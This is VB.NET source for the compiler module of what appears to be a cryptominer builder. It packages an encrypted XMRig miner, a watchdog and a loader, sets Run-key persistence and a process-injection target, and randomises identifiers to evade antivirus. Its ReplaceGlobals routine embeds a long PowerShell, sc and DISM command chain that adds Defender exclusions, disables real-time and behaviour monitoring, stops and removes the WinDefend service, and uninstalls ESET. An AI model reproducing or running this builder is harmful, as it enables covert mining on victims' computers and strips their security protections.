Imports System.CodeDom.Compiler
Imports System.IO
Imports System.Security.Cryptography
Imports System.Text
Imports Microsoft.CSharp

Public Class Codedom
    Public Shared MinerOK As Boolean = False
    Public Shared WatchdogOK As Boolean = False
    Public Shared LoaderOK As Boolean = False
    Public Shared UninstallerOK As Boolean = False
    Public Shared F As Form1
    Public Shared Sub MinerCompiler(ByVal Path As String, ByVal Code As String, ByVal Res As String)
        MinerOK = False

        Dim providerOptions = New Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        Dim OP As String = " /target:library /platform:x64 "

        With Parameters
            .GenerateExecutable = False
            .OutputAssembly = Path
            .CompilerOptions = OP
            .IncludeDebugInformation = False
            If F.FA.toggleEnableDebug.Checked Then
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            End If
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Management.dll")
            .ReferencedAssemblies.Add("System.IO.Compression.dll")
            .ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll")

            F.txtLog.Text = F.txtLog.Text + ("Creating resources..." + vbNewLine)

            Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
                R.AddResource(F.Resources_dll, F.AES_Encryptor(My.Resources.Mandark))
                R.AddResource(F.Resources_xmrig, F.AES_Encryptor(My.Resources.xmrig))
                R.AddResource(F.Resources_winring, F.AES_Encryptor(My.Resources.WinRing0x64))
                If F.chkInstall.Checked And F.toggleWatchdog.Checked Then
                    R.AddResource(F.Resources_watchdog, F.AES_Encryptor(F.watchdogdata))
                End If
                If (F.toggleEnableGPU.Checked) Then
                    R.AddResource(F.Resources_libs, F.AES_Encryptor(My.Resources.libs))
                End If
                R.Generate()
            End Using

            F.txtLog.Text = F.txtLog.Text + ("Embedding resources..." + vbNewLine)
            .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + Res + ".Resources")

            Dim minerbuilder As New StringBuilder(Code)

            ReplaceGlobals(minerbuilder)

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, minerbuilder.ToString())
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox(E.ErrorText, MsgBoxStyle.Critical)
                Next
                MinerOK = False
            Else
                MinerOK = True
            End If

            Try : IO.File.Delete(Environment.GetFolderPath(35) + "\icon.ico") : Catch : End Try
        End With

    End Sub

    Public Shared Sub WatchdogCompiler(ByVal Path As String, ByVal Code As String)
        WatchdogOK = False

        Dim providerOptions = New Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        Dim OP As String = " /target:library /platform:x64 "

        With Parameters
            .GenerateExecutable = False
            .OutputAssembly = Path
            .CompilerOptions = OP
            .IncludeDebugInformation = False
            If F.FA.toggleEnableDebug.Checked Then
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            End If
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Management.dll")

            Dim watchdogbuilder As New StringBuilder(Code)

            ReplaceGlobals(watchdogbuilder)

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, watchdogbuilder.ToString())
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox(E.ErrorText, MsgBoxStyle.Critical)
                Next
                WatchdogOK = False
            Else
                WatchdogOK = True
            End If
        End With

    End Sub

    Public Shared Sub LoaderCompiler(ByVal SavePath As String, ByVal ProgramBytes As Byte(), Optional ICOPath As String = "", Optional RequireAdministrator As Boolean = False)
        LoaderOK = False

        Dim providerOptions = New Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        Dim OP As String = " /target:winexe /platform:x64 "

        If RequireAdministrator Then
            File.WriteAllBytes(SavePath & ".manifest", My.Resources.administrator)
            F.txtLog.Text = F.txtLog.Text + ("Adding manifest..." + vbNewLine)
            OP += " /win32manifest:""" + SavePath & ".manifest" + """"
        End If

        If F.chkIcon.Checked And Not String.IsNullOrEmpty(ICOPath) Then
            F.txtLog.Text = F.txtLog.Text + ("Adding Icon..." + vbNewLine)
            OP += " /win32icon:""" + ICOPath + """"
        End If

        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = SavePath
            .CompilerOptions = OP
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("System.dll")
            If F.FA.toggleEnableDebug.Checked Then
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            End If

            F.txtLog.Text = F.txtLog.Text + ("Creating Loader resources..." + vbNewLine)

            Dim rand As New Random()
            Dim Resources_Program = F.Randomi(rand.Next(5, 40))
            Dim Resources_Loader = F.Randomi(rand.Next(5, 40))

            Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Resources_Loader + ".Resources")
                R.AddResource(Resources_Program, F.AES_Encryptor(ProgramBytes))
                R.Generate()
            End Using

            F.txtLog.Text = F.txtLog.Text + ("Embedding Loader resources..." + vbNewLine)
            .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + Resources_Loader + ".Resources")

            Dim loaderbuilder As New StringBuilder(My.Resources.Loader)

            loaderbuilder.Replace("#Program", Resources_Program)
            loaderbuilder.Replace("#LoaderRes", Resources_Loader)

            ReplaceGlobals(loaderbuilder)

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, loaderbuilder.ToString())
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox(E.ErrorText, MsgBoxStyle.Critical)
                Next
                LoaderOK = False
            Else
                LoaderOK = True
            End If

            If RequireAdministrator Then
                File.Delete(SavePath & ".manifest")
            End If
        End With

    End Sub

    Public Shared Sub UninstallerCompiler(ByVal SavePath As String)
        UninstallerOK = False

        Dim providerOptions = New Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        Dim OP As String = " /target:winexe /platform:x64 "

        If F.FA.toggleAdministrator.Checked Then
            File.WriteAllBytes(SavePath & ".manifest", My.Resources.administrator)
            F.txtLog.Text = F.txtLog.Text + ("Adding manifest..." + vbNewLine)
            OP += " /win32manifest:""" + SavePath & ".manifest" + """"
        End If

        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = SavePath
            .CompilerOptions = OP
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Core.dll")
            .ReferencedAssemblies.Add("System.Management.dll")
            If F.FA.toggleEnableDebug.Checked Then
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            End If

            F.txtLog.Text = F.txtLog.Text + ("Creating Uninstaller..." + vbNewLine)

            Dim uninstallerbuilder As New StringBuilder(My.Resources.Uninstaller)

            ReplaceGlobals(uninstallerbuilder)

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, uninstallerbuilder.ToString())
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox(E.ErrorText, MsgBoxStyle.Critical)
                Next
                UninstallerOK = False
            Else
                UninstallerOK = True
            End If

            If F.FA.toggleAdministrator.Checked Then
                File.Delete(SavePath & ".manifest")
            End If
        End With
    End Sub

    Public Shared Sub ReplaceGlobals(ByRef stringb As StringBuilder)
        If F.FA.toggleKillWD.Checked Then
            stringb.Replace("DefKillWD", "true")
            stringb.Replace("#KillWDCommands", F.EncryptString("powershell -Command Add-MpPreference -ExclusionPath '%cd%' & powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Set-MpPreference -DisableArchiveScanning $true & powershell -Command Set-MpPreference -DisableBehaviorMonitoring $true & powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true & powershell -Command Set-MpPreference -DisableScriptScanning $true & powershell -Command Set-MpPreference -DisableIntrusionPreventionSystem $true & powershell -Command Set-MpPreference -DisableIOAVProtection $true & powershell -Command Set-MpPreference -EnableControlledFolderAccess Disabled & powershell -Command Set-MpPreference -EnableNetworkProtection AuditMode -Force & powershell -Command Set-MpPreference -MAPSReporting Disabled & powershell -Command Set-MpPreference -SubmitSamplesConsent NeverSend & sc config WinDefend start=disabled & sc stop WinDefend & powershell -Command Stop-Service WinDefend  & powershell -Command Set-Service WinDefend -StartupType Disabled & powershell -Command Uninstall-WindowsFeature -Name Windows-Defender & powershell -Command Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI & Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet & Wmic Product where name=""Eset Security"" call uninstall"))
        End If

        If F.FA.toggleEnableDebug.Checked Then
            stringb.Replace("DefDebug", "true")
        End If

        If F.toggleEnableGPU.Checked Then
            stringb.Replace("DefGPU", "true")
        End If

        If F.chkInstall.Checked Then
            stringb.Replace("DefInstall", "true")

            Dim installdir As String

            Select Case F.txtInstallPathMain.Text
                Case "AppData"
                    installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)"
                Case "UserProfile"
                    installdir = "Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)"
                Case "Temp"
                    installdir = "Path.GetTempPath()"
                Case Else
                    installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)"
            End Select

            stringb.Replace("PayloadPath", "System.IO.Path.Combine(" & installdir & "," & Chr(34) & F.txtInstallFileName.Text & Chr(34) & ")")

            If F.toggleWatchdog.Checked Then
                stringb.Replace("DefWatchdog", "true")
            End If
        End If

        If F.chkAssembly.Checked Then
            stringb.Replace("DefAssembly", "true")

            stringb.Replace("%Title%", F.txtTitle.Text)
            stringb.Replace("%Description%", F.txtDescription.Text)
            stringb.Replace("%Company%", F.txtCompany.Text)
            stringb.Replace("%Product%", F.txtProduct.Text)
            stringb.Replace("%Copyright%", F.txtCopyright.Text)
            stringb.Replace("%Trademark%", F.txtTrademark.Text)
            stringb.Replace("%v1%", F.num_Assembly1.Text)
            stringb.Replace("%v2%", F.num_Assembly2.Text)
            stringb.Replace("%v3%", F.num_Assembly3.Text)
            stringb.Replace("%v4%", F.num_Assembly4.Text)
            stringb.Replace("%Guid%", Guid.NewGuid.ToString)
        End If

        stringb.Replace("#STARTDELAY", F.txtStartDelay.Text)
        stringb.Replace("#KEY", F.AESKEY)
        stringb.Replace("#SALT", F.SALT)
        stringb.Replace("#IV", F.IV)
        stringb.Replace("#CLKEY", F.EncryptString("UXUUXUUXUUCommandULineUUXUUXUUXU"))
        stringb.Replace("#CLIV", F.EncryptString("UUCommandULineUU"))
        stringb.Replace("#LIBSPATH", F.EncryptString("Microsoft\Libs\"))
        stringb.Replace("#DLLSTR", F.EncryptString("Mandark.Mandark"))
        stringb.Replace("#DLLOAD", F.EncryptString("Load"))
        stringb.Replace("#REGKEY", F.EncryptString("Software\Microsoft\Windows\CurrentVersion\Run\"))
        stringb.Replace("#InjectionTarget", F.EncryptString(F.InjectionTarget(0)))
        stringb.Replace("#InjectionDir", F.InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", """ + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + """))

        stringb.Replace("RInstall", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RGetTheResource", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RGetString", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RRun", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RBaseFolder", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RCheckProc", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RInitialize", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RGetGPU", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RAES_Encryptor", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RAES_Decryptor", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RTruncate", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RCommandLineEncrypt", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RWDLoop", F.Randomi(F.rand.Next(5, 40)))

        stringb.Replace("rarg1", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rarg2", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rarg3", F.Randomi(F.rand.Next(5, 40)))
    End Sub
End Class
